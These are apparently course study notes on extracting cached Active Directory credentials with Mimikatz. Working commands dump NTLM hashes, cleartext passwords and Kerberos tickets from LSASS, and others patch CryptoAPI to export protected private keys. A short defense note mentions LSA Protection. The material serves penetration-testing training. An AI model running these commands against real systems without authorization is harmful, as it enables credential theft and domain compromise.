# 23.1.3 — Cached AD Credentials (Mimikatz)

- Module: PEN-200 · 23. Attacking Active Directory Authentication
- Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.1.3)
- Code blocks: 5

> Windows caches password hashes and Kerberos tickets in **LSASS** memory (for Kerberos SSO / TGT
> renewal). Reading them needs **SYSTEM / local admin** — often via a local privilege escalation
> first. Mimikatz is the standard extractor. Output omitted.

## Connect as a local admin and launch Mimikatz (elevated)

```bash
xfreerdp /cert-ignore /u:{{USERNAME}} /d:{{DOMAIN}} /p:{{PASSWORD}} /v:{{TARGET_IP}}
```

```powershell
cd C:\Tools
.\mimikatz.exe
privilege::debug          # engage SeDebugPrivilege (interact with other-account processes)
```

## Dump cached hashes for all logged-on users

```
sekurlsa::logonpasswords
```

> Returns NTLM + SHA1 (+ WDigest **cleartext** on older/legacy-configured hosts) for every logged-on
> user, including RDP sessions.

## Dump cached Kerberos tickets

```powershell
dir \\{{COMPUTER_NAME}}.{{DOMAIN}}\backup   # touch a share first to create/cache a service ticket
```

```
sekurlsa::tickets                # lists TGTs + TGSs in LSASS
```

> A stolen **TGS** grants only its specific resource; a stolen **TGT** lets you request TGSs for
> anything. Mimikatz can also export/import tickets to disk (used in [[28-pass-the-ticket]]).

## Bonus: export a "non-exportable" certificate private key (AD CS)

```
crypto::capi        # patch CryptoAPI
crypto::cng         # patch KeyIso service → makes non-exportable keys exportable
```

> **Defense:** LSA Protection (RunAsPPL registry key) blocks reading LSASS memory. Standalone
> Mimikatz is heavily signatured — bypasses/AV-evasion are **out of OSCP scope** (PEN-300 topic);
> here we just run it directly.
